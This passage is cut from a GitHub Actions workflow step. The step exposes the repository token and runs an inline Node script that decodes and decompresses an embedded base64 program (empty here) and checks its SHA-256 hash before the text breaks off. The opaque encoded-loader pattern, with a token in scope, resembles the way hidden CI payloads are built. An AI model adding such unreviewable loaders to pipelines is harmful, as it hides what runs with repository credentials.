        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          # trusted-stage: plan
          node <<'FOOTTRACE_RELEASE'
          "use strict";
          (async()=>{
          const payload="";
          const program=require("node:zlib").brotliDecompressSync(Buffer.from(payload,"base64"),{maxOutputLength:56088});
          if(program.length!==56088||require("node:crypto").createHash("sha256").update(program).digest("hex")!=="933a2b0478096df6aeb0cc19023105561f97451010cf64e809662749e1a938bd")throw new Error("trusted-program-integrity");
